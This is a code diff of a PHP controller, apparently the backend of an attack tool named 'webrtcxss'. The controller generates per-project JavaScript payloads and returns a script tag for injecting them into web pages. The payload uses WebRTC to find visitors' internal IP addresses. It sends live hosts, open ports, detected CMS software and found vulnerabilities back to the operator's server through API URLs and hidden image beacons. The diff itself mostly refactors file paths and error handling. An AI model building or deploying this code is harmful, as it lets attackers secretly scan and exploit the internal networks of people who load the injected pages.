@@ -2,6 +2,12 @@
 namespace Home\Controller;
 use Think\Controller;
 class RootApiController extends Controller {
+    public function _initialize(){
+        $this->domain = 'http://'.I('server.HTTP_HOST');
+        $this->jspath = $this->domain.__ROOT__.str_replace('.','',CACHE_PATH);
+    }
+
+
     public function addProject(){
         if(I('post.name') == ""){
             $this->ajaxReturn(array(
@@ -18,18 +24,22 @@ class RootApiController extends Controller {
         $project['onlystring'] = $md5string;
         $project['create_time'] = date('Y-m-d H:i:s');
         $projectData = M("project");
-        $projectData->data($project)->add();
-        $domain = I('server.HTTP_HOST');
-        $file = './js/'.$md5string.'.js';
+        $file = $this->jspath.$md5string.'.js';
+        $jsfile = CACHE_PATH.$md5string.'.js';
+        $sendsurvivalIp = $this->domain.U('Home/Api/survivalIp');
+        $snedIteratesIpUrl = $this->domain.U('Home/Api/survivalPortIp');
+        $snedIteratesCmsIpUrl = $this->domain.U('Home/Api/survivalCmsIp');
+        $sendExistenceVul = $this->domain.U('Home/Api/existenceVul');
+        $stageSrcUrl = $this->domain.U('Home/Api/stage',array("onlystring"=>""));
         $content = <<<WEBRTCJS
 var onlyString = "$md5string";
 var ipList               = [];
 var survivalIpLIst       = [];
 var deathIpLIst          = [];
-var sendsurvivalIp       = "http://$domain/Api/survivalIp";
-var snedIteratesIpUrl    = "http://$domain/Api/survivalPortIp";
-var snedIteratesCmsIpUrl = "http://$domain/Api/survivalCmsIp"
-var sendExistenceVul     = "http://$domain/Api/existenceVul";
+var sendsurvivalIp       = "$sendsurvivalIp";
+var snedIteratesIpUrl    = "$snedIteratesIpUrl";
+var snedIteratesCmsIpUrl = "$snedIteratesCmsIpUrl";
+var sendExistenceVul     = "$sendExistenceVul"
 var webrtcxss = {
     webrtc        : function(callback){
         var ip_dups           = {};
@@ -152,18 +162,29 @@ function vulConfirm(cmsConfirmInfo){
 }
 function stage(num){
     var updataStage = document.createElement("img");
-    updataStage.setAttribute("src","http://$domain/Api/stage/onlystring/"+onlyString+"/updata/"+num);
+    updataStage.setAttribute("src","$stageSrcUrl"+onlyString+"&updata="+num);
     updataStage.setAttribute("style","display:none;");
     document.getElementsByTagName("body")[0].appendChild(updataStage);
 }
 WEBRTCJS;
-        file_put_contents($file, $content);
-        file_put_contents($file, $content,LOCK_EX);
-        $this->ajaxReturn(array(
-            "typeMsg" => "success",
-            "msgText" => "<script src='http://$domain/js/$md5string.js'></script>",
-        ));
+
+        if(file_put_contents($jsfile, $content)){
+            $projectData->data($project)->add();
+            $this->ajaxReturn(array(
+                "typeMsg" => "success",
+                "msgText" => "<script src='".$file."'></script>",
+             ));
+        }else{
+            $this->ajaxReturn(array(
+                "typeMsg" => "error",
+                "msgText" => "添加失败",
+             ));
+        }
+        //file_put_contents($file, $content,LOCK_EX);
     }
+
+
+
     public function delProjectId(){
         if(I('post.id','','int')  == ""){
             $this->ajaxReturn(array(
@@ -175,15 +196,24 @@ WEBRTCJS;
         $existencevul = M("existencevul");
         $existencecmsip = M('existencecmsip');
         $onlystring = $project->where('id="'.I('post.id','','int').'"')->find()['onlystring'];
-        unlink("./js/$onlystring.js");
-        $project->where('id="'.I('post.id','','int').'"')->delete();
-        $ipdatalist->where('onlystring="'.$onlystring.'"')->delete();
-        $existencevul->where('onlystring="'.$onlystring.'"')->delete();
-        $existencecmsip->where('onlystring="'.$onlystring.'"')->delete();
-        $this->ajaxReturn(array(
-            "typeMsg" => "success",
-            "msgText" => "删除成功",
-        ));
+
+        if(unlink(CACHE_PATH."$onlystring.js")){
+            $project->where('id="'.I('post.id','','int').'"')->delete();
+            $ipdatalist->where('onlystring="'.$onlystring.'"')->delete();
+            $existencevul->where('onlystring="'.$onlystring.'"')->delete();
+            $existencecmsip->where('onlystring="'.$onlystring.'"')->delete();
+            $this->ajaxReturn(array(
+                "typeMsg" => "success",
+                "msgText" => "删除成功",
+            ));
+        }else{
+            $this->ajaxReturn(array(
+                "typeMsg" => "error",
+                "msgText" => "删除失败",
+            ));
+        }
+
+
     }
     public function findProject(){
         if(I('get.id','','int')  == ""){
@@ -199,7 +229,8 @@ WEBRTCJS;
         $projectData['onlystring'] = $projectInfo['onlystring'];
         $projectData['stage'] = $projectInfo['stage'];
         $projectData['time'] = $projectInfo['create_time'];
-        $projectData['jsfile'] = "http://".I('server.HTTP_HOST')."/js/".$projectData['onlystring'].".js";
+        $projectData['jsfile'] = $this->jspath.$projectData['onlystring'].".js";
+
         switch ($projectData['stage']) {
             case '0':
                 $projectData['stagestring'] = "未被触发";
